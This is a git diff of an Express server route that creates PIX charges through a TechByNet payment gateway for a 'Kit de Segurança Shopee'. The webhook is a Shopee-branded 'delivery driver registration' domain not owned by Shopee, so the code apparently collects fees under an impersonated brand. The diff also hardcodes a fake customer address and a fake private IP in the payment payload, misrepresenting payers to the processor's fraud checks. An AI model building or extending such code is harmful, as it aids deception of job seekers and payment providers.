@@ -238,35 +238,73 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
     
     console.log('Dados recebidos:', { name, cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`, amount });
     
-    // Integração com TechByNet API
+    // Integração com TechByNet API (URL e formato corretos)
     const apiKey = process.env.TECHBYNET_API_KEY;
-    const baseUrl = 'https://api.techbynet.net.br/pix/v1';
+    const baseUrl = 'https://api-gateway.techbynet.com';
     
-    // Preparar dados da transação
+    // Preparar dados da transação (formato correto TechByNet)
     const customerCpf = cpf.replace(/[^0-9]/g, '');
     const customerPhone = (phone || '11999999999').replace(/[^0-9]/g, '');
+    const amountCents = parseInt(parseFloat(amount.toString()) * 100);
+    
+    // Gerar external_ref único
+    const externalRef = `SHOPEE_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
     
     const payload = {
-      reference_id: `SHOPEE_${Date.now()}_${Math.floor(Math.random() * 10000)}`,
-      amount: parseFloat(amount.toString()),
-      description: description || 'Kit de Segurança Shopee',
-      payer: {
+      amount: amountCents,
+      currency: "BRL",
+      paymentMethod: "PIX",
+      installments: 1,
+      postbackUrl: "https://shopee.cadastrodoentregador.com/techbynet-webhook",
+      metadata: JSON.stringify({
+        source: "shopee_delivery_portal",
+        external_ref: externalRef
+      }),
+      traceable: true,
+      ip: "192.168.1.1",
+      customer: {
         name: name,
         email: userEmail,
-        document: customerCpf,
-        phone: customerPhone
+        document: {
+          number: customerCpf,
+          type: "CPF"
+        },
+        phone: customerPhone,
+        externalRef: externalRef,
+        address: {
+          street: "Rua Principal",
+          streetNumber: "123",
+          complement: "",
+          zipCode: "01000-000",
+          neighborhood: "Centro",
+          city: "São Paulo",
+          state: "SP",
+          country: "BR"
+        }
+      },
+      items: [
+        {
+          title: "Kit de Segurança Shopee",
+          unitPrice: amountCents,
+          quantity: 1,
+          tangible: false,
+          externalRef: externalRef
+        }
+      ],
+      pix: {
+        expiresInDays: 1
       }
     };
     
-    console.log('Enviando payload para TechByNet API...');
+    console.log('Enviando payload para TechByNet API (formato correto)...');
     
-    // Fazer requisição para TechByNet
+    // Fazer requisição para TechByNet (headers corretos)
     const fetch = (await import('node-fetch')).default;
-    const response = await fetch(`${baseUrl}/transaction`, {
+    const response = await fetch(`${baseUrl}/api/user/transactions`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
-        'Authorization': `Bearer ${apiKey}`,
+        'x-api-key': apiKey,
         'User-Agent': 'ShopeeDeliveryApp/1.0'
       },
       body: JSON.stringify(payload)
@@ -282,9 +320,12 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
       });
     }
     
-    // Extrair dados do PIX da resposta
-    const transactionId = responseData.transaction_id || responseData.id;
-    const pixCode = responseData.pix_code || responseData.qr_code;
+    console.log('Resposta TechByNet recebida:', JSON.stringify(responseData, null, 2));
+    
+    // Extrair dados do PIX da resposta (formato TechByNet correto)
+    const transactionData = responseData.data || {};
+    const transactionId = transactionData.id;
+    const pixCode = transactionData.qrCode;
     
     if (!pixCode) {
       console.error('PIX code não encontrado na resposta da TechByNet');
@@ -300,7 +341,8 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
       pixCode: pixCode,
       pixQrCode: pixQrCode,
       status: 'pending',
-      emailSent: false
+      emailSent: false,
+      provider: 'TechByNet'
     };
     
     console.log('✅ Transação TechByNet criada com sucesso:', transactionId);
